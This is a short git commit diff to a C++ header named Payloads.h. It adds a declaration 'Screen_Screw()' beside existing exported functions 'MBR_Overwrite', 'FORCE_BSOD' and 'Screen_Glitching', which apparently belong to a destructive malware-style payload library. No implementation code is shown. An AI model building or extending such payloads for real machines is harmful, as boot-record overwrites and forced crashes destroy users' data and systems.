700a5ceaef2bc2cb8dac5a521d10bbe6c3697e8f
Chris Martin <chrixsmar@gmail.com>
2018-04-03 14:49:53 +0100

    Screen Screw

--- Payloads/Payloads.h
+++ Payloads/Payloads.h
@@ -13,6 +13,7 @@ namespace Payloads
 		__declspec(dllexport) void MBR_Overwrite();
 		__declspec(dllexport) void FORCE_BSOD();
 		__declspec(dllexport) void Screen_Glitching();
+		__declspec(dllexport) void Screen_Screw();
 	private:
 		
 	};
